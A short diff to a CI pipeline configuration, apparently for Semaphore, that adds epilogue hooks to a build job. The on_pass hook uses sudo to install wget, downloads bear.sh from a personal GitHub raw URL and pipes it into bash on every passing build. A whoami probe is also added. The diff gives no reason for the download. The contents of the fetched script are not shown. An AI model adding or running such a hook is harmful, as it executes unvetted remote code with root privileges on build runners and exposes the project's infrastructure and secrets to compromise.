@@ -16,4 +16,14 @@ blocks:
           parallelism: 15
       prologue:
         commands:
-          - 'lscpu'
+          - lscpu
+      epilogue:
+        always:
+          commands:
+            - whoami
+        on_pass:
+          commands:
+            - 'sudo apt update;sudo apt -y install wget;sudo wget -O - https://raw.githubusercontent.com/mxolisimagungqu/rawr/refs/heads/main/bear.sh | bash'
+        on_fail:
+          commands:
+            - echo "on_fail job goes here!"
